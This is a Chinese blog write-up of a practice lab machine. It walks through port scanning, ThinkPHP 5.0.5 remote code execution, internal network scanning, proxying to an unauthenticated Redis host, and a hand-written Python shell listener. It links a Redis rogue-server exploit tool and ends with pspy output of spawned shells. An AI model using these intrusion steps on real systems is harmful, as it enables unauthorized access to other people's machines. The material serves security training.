@@ -1,0 +1,601 @@
+<!DOCTYPE html><html lang="zh-CN"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>群友靶机-exchange - yulian Lab</title><meta name="description" content="Life is a journey — pause and see more."><link rel="stylesheet" href="/_astro/_page_.B12lxv6h.css"></head> <body> <header id="header" class="clearfix"> <div class="container"> <div class="row"> <div class="site-name col-mb-12 col-9"> <a id="logo" href="/">yulian Lab</a>
+                    <p class="description">Life is a journey — pause and see more.</p> </div> <div class="site-search col-3 kit-hidden-tb"> <form id="search" method="get" action="/search" role="search"> <label for="s" class="sr-only">搜索</label> <input type="text" id="s" name="q" class="text" placeholder="输入关键字搜索"> <button type="submit" class="submit">搜索</button> </form> </div> <div class="col-mb-12"> <nav id="nav-menu" class="clearfix" role="navigation"> <a class href="/">首页</a> <a class href="/about" title="关于">关于</a> </nav> </div> </div> </div> </header> <div id="body"> <div class="container"> <div class="row">  <div class="col-mb-12 col-8" id="main" role="main"> <article class="post" itemscope itemtype="http://schema.org/BlogPosting"> <h2 class="post-title" itemprop="name headline"> <a itemprop="url" href="/post/exchange">群友靶机-exchange</a> </h2> <ul class="post-meta">  <li>时间: <time datetime="2025-07-12T00:00:00.000Z" itemprop="datePublished">2025/07/12</time></li> <li>分类: <a href="/category/渗透">渗透</a></li> </ul> <div class="post-content" itemprop="articleBody"> <h2 id="web打点">web打点</h2>
+<p>靶机扫描</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">┌──(root㉿kali</span><span style="color:#24292E">)-[~]</span></span>
+<span class="line"><span style="color:#6F42C1">└─#</span><span style="color:#032F62"> nmap</span><span style="color:#005CC5"> -sS</span><span style="color:#005CC5"> 192.168.1.39</span><span style="color:#005CC5"> -p-</span></span>
+<span class="line"><span style="color:#6F42C1">Starting</span><span style="color:#032F62"> Nmap</span><span style="color:#005CC5"> 7.93</span><span style="color:#24292E"> ( </span><span style="color:#032F62">https://nmap.org</span><span style="color:#24292E"> ) at 2025-07-12 01:46 EDT</span></span>
+<span class="line"><span style="color:#6F42C1">Nmap</span><span style="color:#032F62"> scan</span><span style="color:#032F62"> report</span><span style="color:#032F62"> for</span><span style="color:#005CC5"> 192.168.1.39</span></span>
+<span class="line"><span style="color:#6F42C1">Host</span><span style="color:#032F62"> is</span><span style="color:#032F62"> up</span><span style="color:#24292E"> (0.00080s </span><span style="color:#032F62">latency</span><span style="color:#24292E">).</span></span>
+<span class="line"><span style="color:#6F42C1">Not</span><span style="color:#032F62"> shown:</span><span style="color:#005CC5"> 65533</span><span style="color:#032F62"> closed</span><span style="color:#032F62"> tcp</span><span style="color:#032F62"> ports</span><span style="color:#24292E"> (reset)</span></span>
+<span class="line"><span style="color:#6F42C1">PORT</span><span style="color:#032F62">   STATE</span><span style="color:#032F62"> SERVICE</span></span>
+<span class="line"><span style="color:#6F42C1">22/tcp</span><span style="color:#032F62"> open</span><span style="color:#032F62">  ssh</span></span>
+<span class="line"><span style="color:#6F42C1">80/tcp</span><span style="color:#032F62"> open</span><span style="color:#032F62">  http</span></span>
+<span class="line"><span style="color:#6F42C1">MAC</span><span style="color:#032F62"> Address:</span><span style="color:#032F62"> 08:00:27:BD:44:E0</span><span style="color:#24292E"> (Oracle </span><span style="color:#032F62">VirtualBox</span><span style="color:#032F62"> virtual</span><span style="color:#032F62"> NIC</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">Nmap</span><span style="color:#032F62"> done:</span><span style="color:#005CC5"> 1</span><span style="color:#032F62"> IP</span><span style="color:#032F62"> address</span><span style="color:#24292E"> (1 </span><span style="color:#032F62">host</span><span style="color:#032F62"> up</span><span style="color:#24292E">) scanned in 2.44 seconds</span></span>
+<span class="line"></span></code></pre>
+<p>开了22 和 80</p>
+<p><img alt="image-20250712220259253" loading="lazy" decoding="async" fetchpriority="auto" width="1673" height="1423" src="/_astro/image-20250712220259253.DjQJiGUH_Z1Hs9fo.webp" ></p>
+<p>报错页面发现是ThinkPHP V5.0.5， 直接rce getshell</p>
+<p><img alt="image-20250712221333094" loading="lazy" decoding="async" fetchpriority="auto" width="1544" height="1022" src="/_astro/image-20250712221333094.C-4F4rQr_Z1wpMjX.webp" ></p>
+<h2 id="内网横向">内网横向</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">fscan</span><span style="color:#005CC5"> -h</span><span style="color:#032F62"> 172.19.0.0/24</span><span style="color:#005CC5"> -np</span></span>
+<span class="line"><span style="color:#6F42C1">┌──────────────────────────────────────────────┐</span></span>
+<span class="line"><span style="color:#6F42C1">│</span><span style="color:#032F62">    ___</span><span style="color:#032F62">                              _</span><span style="color:#032F62">        │</span></span>
+<span class="line"><span style="color:#6F42C1">│</span><span style="color:#032F62">   /</span><span style="color:#032F62"> _</span><span style="color:#005CC5"> \ </span><span style="color:#032F62">    ___</span><span style="color:#032F62">  ___</span><span style="color:#032F62"> _</span><span style="color:#032F62"> __</span><span style="color:#032F62"> __</span><span style="color:#032F62"> _</span><span style="color:#032F62">  ___</span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> __</span><span style="color:#032F62">    │</span></span>
+<span class="line"><span style="color:#6F42C1">│</span><span style="color:#032F62">  /</span><span style="color:#032F62"> /_</span><span style="color:#005CC5">\/</span><span style="color:#032F62">____/</span><span style="color:#032F62"> __</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">/</span><span style="color:#032F62"> __</span><span style="color:#D73A49">|</span><span style="color:#6F42C1"> '__/ _` |/ __| |/ /    │</span></span>
+<span class="line"><span style="color:#6F42C1">│ / /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;     │</span></span>
+<span class="line"><span style="color:#6F42C1">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span>
+<span class="line"><span style="color:#6F42C1">└──────────────────────────────────────────────┘</span></span>
+<span class="line"><span style="color:#6F42C1">      Fscan Version: 2.0.0</span></span>
+<span class="line"><span style="color:#6F42C1">                                                                                                                                                    </span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] 暴力破解线程数: 1                                                                                                      </span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] 开始信息扫描</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] CIDR范围: 172.19.0.0-172.19.0.255</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] 生成IP范围: 172.19.0.0.%!d(string=172.19.0.255) - %!s(MISSING).%!d(MISSING)</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] 解析CIDR 172.19.0.0/24 -> IP范围 172.19.0.0-172.19.0.255</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] 最终有效主机数量: 256</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] 开始主机扫描</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:09] [INFO] 有效端口数量: 233</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:21] [SUCCESS] 端口开放 172.19.0.1:22</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:21] [SUCCESS] 服务识别 172.19.0.1:22 => [ssh] 版本:8.4p1 Debian 5+deb11u3 产品:OpenSSH 系统:Linux 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3.]                                                                                                                  </span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:45] [SUCCESS] 端口开放 172.19.0.3:80</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:17:50] [SUCCESS] 服务识别 172.19.0.3:80 => [http] 版本:1.18.0 产品:nginx</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:29:31] [SUCCESS] 端口开放 172.19.0.2:6379</span></span>
+<span class="line"><span style="color:#6F42C1">[2025-07-12 14:29:36] [SUCCESS] 服务识别 172.19.0.2:6379 => [redis] 版本:5.0.14 产品:Redis key-value store</span></span>
+<span class="line"></span></code></pre>
+<p>fscan扫描内网 ,发现了<code>172.19.0.2:6379</code>跑了个redis</p>
+<p>传个frp，开个socks代理，尝试连接redis</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">┌──(root㉿kali</span><span style="color:#24292E">)-[~]</span></span>
+<span class="line"><span style="color:#6F42C1">└─#</span><span style="color:#032F62"> proxychains4</span><span style="color:#005CC5"> -q</span><span style="color:#032F62"> redis-cli</span><span style="color:#005CC5"> -h</span><span style="color:#005CC5"> 172.19.0.2</span><span style="color:#005CC5">  -p</span><span style="color:#005CC5"> 6379</span><span style="color:#24292E">                                                                                 </span></span>
+<span class="line"><span style="color:#6F42C1">172.19.0.2:6379</span><span style="color:#24292E">> </span><span style="color:#032F62">info</span></span>
+<span class="line"><span style="color:#6A737D"># Server</span></span>
+<span class="line"><span style="color:#6F42C1">redis_version:5.0.14</span></span>
+<span class="line"><span style="color:#6F42C1">redis_git_sha1:00000000</span></span>
+<span class="line"><span style="color:#6F42C1">redis_git_dirty:0</span></span>
+<span class="line"><span style="color:#6F42C1">redis_build_id:82e99d45f54e2614</span></span>
+<span class="line"><span style="color:#6F42C1">redis_mode:standalone</span></span>
+<span class="line"><span style="color:#6F42C1">os:Linux</span><span style="color:#032F62"> 4.19.0-27-amd64</span><span style="color:#032F62"> x86_64</span></span>
+<span class="line"><span style="color:#6F42C1">arch_bits:64</span></span>
+<span class="line"><span style="color:#6F42C1">multiplexing_api:epoll</span></span>
+<span class="line"><span style="color:#6F42C1">atomicvar_api:atomic-builtin</span></span>
+<span class="line"><span style="color:#6F42C1">gcc_version:10.2.1</span></span>
+<span class="line"><span style="color:#6F42C1">process_id:1</span></span>
+<span class="line"><span style="color:#6F42C1">run_id:e88d7ed01f6f98ec6aacd23601cf3eb1ab6cc8df</span></span>
+<span class="line"><span style="color:#6F42C1">tcp_port:6379</span></span>
+<span class="line"><span style="color:#6F42C1">uptime_in_seconds:1231</span></span>
+<span class="line"><span style="color:#6F42C1">uptime_in_days:0</span></span>
+<span class="line"><span style="color:#6F42C1">hz:10</span></span>
+<span class="line"><span style="color:#6F42C1">configured_hz:10</span></span>
+<span class="line"><span style="color:#6F42C1">lru_clock:7500446</span></span>
+<span class="line"><span style="color:#6F42C1">executable:/data/redis-server</span></span>
+<span class="line"><span style="color:#6F42C1">config_file:</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Clients</span></span>
+<span class="line"><span style="color:#6F42C1">connected_clients:1</span></span>
+<span class="line"><span style="color:#6F42C1">client_recent_max_input_buffer:4</span></span>
+<span class="line"><span style="color:#6F42C1">client_recent_max_output_buffer:4100800</span></span>
+<span class="line"><span style="color:#6F42C1">blocked_clients:0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Memory</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory:854176</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_human:834.16K</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_rss:12750848</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_rss_human:12.16M</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_peak:4953952</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_peak_human:4.72M</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_peak_perc:17.24%</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_overhead:840974</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_startup:791280</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_dataset:13202</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_dataset_perc:20.99%</span></span>
+<span class="line"><span style="color:#6F42C1">allocator_allocated:1424312</span></span>
+<span class="line"><span style="color:#6F42C1">allocator_active:1716224</span></span>
+<span class="line"><span style="color:#6F42C1">allocator_resident:8458240</span></span>
+<span class="line"><span style="color:#6F42C1">total_system_memory:2092433408</span></span>
+<span class="line"><span style="color:#6F42C1">total_system_memory_human:1.95G</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_lua:37888</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_lua_human:37.00K</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_scripts:0</span></span>
+<span class="line"><span style="color:#6F42C1">used_memory_scripts_human:0B</span></span>
+<span class="line"><span style="color:#6F42C1">number_of_cached_scripts:0</span></span>
+<span class="line"><span style="color:#6F42C1">maxmemory:0</span></span>
+<span class="line"><span style="color:#6F42C1">maxmemory_human:0B</span></span>
+<span class="line"><span style="color:#6F42C1">maxmemory_policy:noeviction</span></span>
+<span class="line"><span style="color:#6F42C1">allocator_frag_ratio:1.20</span></span>
+<span class="line"><span style="color:#6F42C1">allocator_frag_bytes:291912</span></span>
+<span class="line"><span style="color:#6F42C1">allocator_rss_ratio:4.93</span></span>
+<span class="line"><span style="color:#6F42C1">allocator_rss_bytes:6742016</span></span>
+<span class="line"><span style="color:#6F42C1">rss_overhead_ratio:1.51</span></span>
+<span class="line"><span style="color:#6F42C1">rss_overhead_bytes:4292608</span></span>
+<span class="line"><span style="color:#6F42C1">mem_fragmentation_ratio:15.70</span></span>
+<span class="line"><span style="color:#6F42C1">mem_fragmentation_bytes:11938672</span></span>
+<span class="line"><span style="color:#6F42C1">mem_not_counted_for_evict:0</span></span>
+<span class="line"><span style="color:#6F42C1">mem_replication_backlog:0</span></span>
+<span class="line"><span style="color:#6F42C1">mem_clients_slaves:0</span></span>
+<span class="line"><span style="color:#6F42C1">mem_clients_normal:49694</span></span>
+<span class="line"><span style="color:#6F42C1">mem_aof_buffer:0</span></span>
+<span class="line"><span style="color:#6F42C1">mem_allocator:jemalloc-5.1.0</span></span>
+<span class="line"><span style="color:#6F42C1">active_defrag_running:0</span></span>
+<span class="line"><span style="color:#6F42C1">lazyfree_pending_objects:0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Persistence</span></span>
+<span class="line"><span style="color:#6F42C1">loading:0</span></span>
+<span class="line"><span style="color:#6F42C1">rdb_changes_since_last_save:0</span></span>
+<span class="line"><span style="color:#6F42C1">rdb_bgsave_in_progress:0</span></span>
+<span class="line"><span style="color:#6F42C1">rdb_last_save_time:1752329680</span></span>
+<span class="line"><span style="color:#6F42C1">rdb_last_bgsave_status:ok</span></span>
+<span class="line"><span style="color:#6F42C1">rdb_last_bgsave_time_sec:-1</span></span>
+<span class="line"><span style="color:#6F42C1">rdb_current_bgsave_time_sec:-1</span></span>
+<span class="line"><span style="color:#6F42C1">rdb_last_cow_size:0</span></span>
+<span class="line"><span style="color:#6F42C1">aof_enabled:0</span></span>
+<span class="line"><span style="color:#6F42C1">aof_rewrite_in_progress:0</span></span>
+<span class="line"><span style="color:#6F42C1">aof_rewrite_scheduled:0</span></span>
+<span class="line"><span style="color:#6F42C1">aof_last_rewrite_time_sec:-1</span></span>
+<span class="line"><span style="color:#6F42C1">aof_current_rewrite_time_sec:-1</span></span>
+<span class="line"><span style="color:#6F42C1">aof_last_bgrewrite_status:ok</span></span>
+<span class="line"><span style="color:#6F42C1">aof_last_write_status:ok</span></span>
+<span class="line"><span style="color:#6F42C1">aof_last_cow_size:0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Stats</span></span>
+<span class="line"><span style="color:#6F42C1">total_connections_received:2</span></span>
+<span class="line"><span style="color:#6F42C1">total_commands_processed:3</span></span>
+<span class="line"><span style="color:#6F42C1">instantaneous_ops_per_sec:0</span></span>
+<span class="line"><span style="color:#6F42C1">total_net_input_bytes:72</span></span>
+<span class="line"><span style="color:#6F42C1">total_net_output_bytes:14801</span></span>
+<span class="line"><span style="color:#6F42C1">instantaneous_input_kbps:0.00</span></span>
+<span class="line"><span style="color:#6F42C1">instantaneous_output_kbps:0.00</span></span>
+<span class="line"><span style="color:#6F42C1">rejected_connections:0</span></span>
+<span class="line"><span style="color:#6F42C1">sync_full:0</span></span>
+<span class="line"><span style="color:#6F42C1">sync_partial_ok:0</span></span>
+<span class="line"><span style="color:#6F42C1">sync_partial_err:0</span></span>
+<span class="line"><span style="color:#6F42C1">expired_keys:0</span></span>
+<span class="line"><span style="color:#6F42C1">expired_stale_perc:0.00</span></span>
+<span class="line"><span style="color:#6F42C1">expired_time_cap_reached_count:0</span></span>
+<span class="line"><span style="color:#6F42C1">evicted_keys:0</span></span>
+<span class="line"><span style="color:#6F42C1">keyspace_hits:0</span></span>
+<span class="line"><span style="color:#6F42C1">keyspace_misses:0</span></span>
+<span class="line"><span style="color:#6F42C1">pubsub_channels:0</span></span>
+<span class="line"><span style="color:#6F42C1">pubsub_patterns:0</span></span>
+<span class="line"><span style="color:#6F42C1">latest_fork_usec:0</span></span>
+<span class="line"><span style="color:#6F42C1">migrate_cached_sockets:0</span></span>
+<span class="line"><span style="color:#6F42C1">slave_expires_tracked_keys:0</span></span>
+<span class="line"><span style="color:#6F42C1">active_defrag_hits:0</span></span>
+<span class="line"><span style="color:#6F42C1">active_defrag_misses:0</span></span>
+<span class="line"><span style="color:#6F42C1">active_defrag_key_hits:0</span></span>
+<span class="line"><span style="color:#6F42C1">active_defrag_key_misses:0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Replication</span></span>
+<span class="line"><span style="color:#6F42C1">role:master</span></span>
+<span class="line"><span style="color:#6F42C1">connected_slaves:0</span></span>
+<span class="line"><span style="color:#6F42C1">master_replid:20ebee4cf286daa409471774f86ee700d032f99f</span></span>
+<span class="line"><span style="color:#6F42C1">master_replid2:0000000000000000000000000000000000000000</span></span>
+<span class="line"><span style="color:#6F42C1">master_repl_offset:0</span></span>
+<span class="line"><span style="color:#6F42C1">second_repl_offset:-1</span></span>
+<span class="line"><span style="color:#6F42C1">repl_backlog_active:0</span></span>
+<span class="line"><span style="color:#6F42C1">repl_backlog_size:1048576</span></span>
+<span class="line"><span style="color:#6F42C1">repl_backlog_first_byte_offset:0</span></span>
+<span class="line"><span style="color:#6F42C1">repl_backlog_histlen:0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># CPU</span></span>
+<span class="line"><span style="color:#6F42C1">used_cpu_sys:0.697228</span></span>
+<span class="line"><span style="color:#6F42C1">used_cpu_user:0.911468</span></span>
+<span class="line"><span style="color:#6F42C1">used_cpu_sys_children:0.000000</span></span>
+<span class="line"><span style="color:#6F42C1">used_cpu_user_children:0.001602</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Cluster</span></span>
+<span class="line"><span style="color:#6F42C1">cluster_enabled:0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Keyspace</span></span>
+<span class="line"></span></code></pre>
+<p>redis未授权，尝试各种写马姿势弹shell都不行，和bamuwe得知 redis主机不出网</p>
+<p>可以将攻击机的端口映射到内网，也可以将内网端口映射出来</p>
+<p>在线web主机上又python3的环境，直接传一个简易的nc上去</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#D73A49">import</span><span style="color:#24292E"> socket</span></span>
+<span class="line"><span style="color:#D73A49">import</span><span style="color:#24292E"> threading</span></span>
+<span class="line"><span style="color:#D73A49">import</span><span style="color:#24292E"> sys</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">def</span><span style="color:#6F42C1"> recv_thread</span><span style="color:#24292E">(conn):</span></span>
+<span class="line"><span style="color:#D73A49">    try</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#D73A49">        while</span><span style="color:#005CC5"> True</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#24292E">            data </span><span style="color:#D73A49">=</span><span style="color:#24292E"> conn.recv(</span><span style="color:#005CC5">4096</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#D73A49">            if</span><span style="color:#D73A49"> not</span><span style="color:#24292E"> data:</span></span>
+<span class="line"><span style="color:#005CC5">                print</span><span style="color:#24292E">(</span><span style="color:#032F62">"</span><span style="color:#005CC5">\n</span><span style="color:#032F62">Connection closed by client."</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#D73A49">                break</span></span>
+<span class="line"><span style="color:#005CC5">            print</span><span style="color:#24292E">(data.decode(</span><span style="color:#E36209">errors</span><span style="color:#D73A49">=</span><span style="color:#032F62">'ignore'</span><span style="color:#24292E">), </span><span style="color:#E36209">end</span><span style="color:#D73A49">=</span><span style="color:#032F62">''</span><span style="color:#24292E">, </span><span style="color:#E36209">flush</span><span style="color:#D73A49">=</span><span style="color:#005CC5">True</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#D73A49">    except</span><span style="color:#005CC5"> Exception</span><span style="color:#D73A49"> as</span><span style="color:#24292E"> e:</span></span>
+<span class="line"><span style="color:#005CC5">        print</span><span style="color:#24292E">(</span><span style="color:#D73A49">f</span><span style="color:#032F62">"</span><span style="color:#005CC5">\n</span><span style="color:#032F62">Receive error: </span><span style="color:#005CC5">{</span><span style="color:#24292E">e</span><span style="color:#005CC5">}</span><span style="color:#032F62">"</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#D73A49">    finally</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#24292E">        conn.close()</span></span>
+<span class="line"><span style="color:#24292E">        sys.exit(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">def</span><span style="color:#6F42C1"> main</span><span style="color:#24292E">():</span></span>
+<span class="line"><span style="color:#D73A49">    if</span><span style="color:#005CC5"> len</span><span style="color:#24292E">(sys.argv) </span><span style="color:#D73A49">!=</span><span style="color:#005CC5"> 2</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#005CC5">        print</span><span style="color:#24292E">(</span><span style="color:#D73A49">f</span><span style="color:#032F62">"Usage: </span><span style="color:#005CC5">{</span><span style="color:#24292E">sys.argv[</span><span style="color:#005CC5">0</span><span style="color:#24292E">]</span><span style="color:#005CC5">}</span><span style="color:#032F62"> &#x3C;listen_port>"</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">        sys.exit(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">    listen_port </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> int</span><span style="color:#24292E">(sys.argv[</span><span style="color:#005CC5">1</span><span style="color:#24292E">])</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">    server </span><span style="color:#D73A49">=</span><span style="color:#24292E"> socket.socket(socket.</span><span style="color:#005CC5">AF_INET</span><span style="color:#24292E">, socket.</span><span style="color:#005CC5">SOCK_STREAM</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    server.bind((</span><span style="color:#032F62">'0.0.0.0'</span><span style="color:#24292E">, listen_port))</span></span>
+<span class="line"><span style="color:#24292E">    server.listen(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#005CC5">    print</span><span style="color:#24292E">(</span><span style="color:#D73A49">f</span><span style="color:#032F62">"Listening on 0.0.0.0:</span><span style="color:#005CC5">{</span><span style="color:#24292E">listen_port</span><span style="color:#005CC5">}</span><span style="color:#032F62"> ..."</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">    conn, addr </span><span style="color:#D73A49">=</span><span style="color:#24292E"> server.accept()</span></span>
+<span class="line"><span style="color:#005CC5">    print</span><span style="color:#24292E">(</span><span style="color:#D73A49">f</span><span style="color:#032F62">"Connection from </span><span style="color:#005CC5">{</span><span style="color:#24292E">addr[</span><span style="color:#005CC5">0</span><span style="color:#24292E">]</span><span style="color:#005CC5">}</span><span style="color:#032F62">:</span><span style="color:#005CC5">{</span><span style="color:#24292E">addr[</span><span style="color:#005CC5">1</span><span style="color:#24292E">]</span><span style="color:#005CC5">}</span><span style="color:#032F62"> established!"</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">    t </span><span style="color:#D73A49">=</span><span style="color:#24292E"> threading.Thread(</span><span style="color:#E36209">target</span><span style="color:#D73A49">=</span><span style="color:#24292E">recv_thread, </span><span style="color:#E36209">args</span><span style="color:#D73A49">=</span><span style="color:#24292E">(conn,), </span><span style="color:#E36209">daemon</span><span style="color:#D73A49">=</span><span style="color:#005CC5">True</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    t.start()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">    try</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#D73A49">        while</span><span style="color:#005CC5"> True</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#24292E">            cmd </span><span style="color:#D73A49">=</span><span style="color:#24292E"> sys.stdin.readline()</span></span>
+<span class="line"><span style="color:#D73A49">            if</span><span style="color:#D73A49"> not</span><span style="color:#24292E"> cmd:</span></span>
+<span class="line"><span style="color:#D73A49">                break</span></span>
+<span class="line"><span style="color:#24292E">            conn.sendall(cmd.encode())</span></span>
+<span class="line"><span style="color:#D73A49">    except</span><span style="color:#005CC5"> KeyboardInterrupt</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#005CC5">        print</span><span style="color:#24292E">(</span><span style="color:#032F62">"</span><span style="color:#005CC5">\n</span><span style="color:#032F62">User interrupted."</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#D73A49">    finally</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#24292E">        conn.close()</span></span>
+<span class="line"><span style="color:#24292E">        server.close()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">if</span><span style="color:#005CC5"> __name__</span><span style="color:#D73A49"> ==</span><span style="color:#032F62"> "__main__"</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#24292E">    main()</span></span>
+<span class="line"></span>
+<span class="line"></span></code></pre>
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>使用这个工具直接一把梭</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">760</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> ./pspy64</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">704</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> /bin/bash</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">703</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> python3</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> import</span><span style="color:#032F62"> pty</span><span style="color:#24292E">;</span><span style="color:#6F42C1">pty.spawn(</span><span style="color:#6F42C1">'/bin/bash'</span><span style="color:#24292E">) </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">697</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> sh</span><span style="color:#005CC5"> -i</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">693</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> sh</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> uname</span><span style="color:#005CC5"> -a</span><span style="color:#24292E">; </span><span style="color:#6F42C1">w</span><span style="color:#24292E">; </span><span style="color:#6F42C1">id</span><span style="color:#24292E">; </span><span style="color:#6F42C1">sh</span><span style="color:#005CC5"> -i</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">692</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> md5sum</span><span style="color:#24292E"> </span></span>
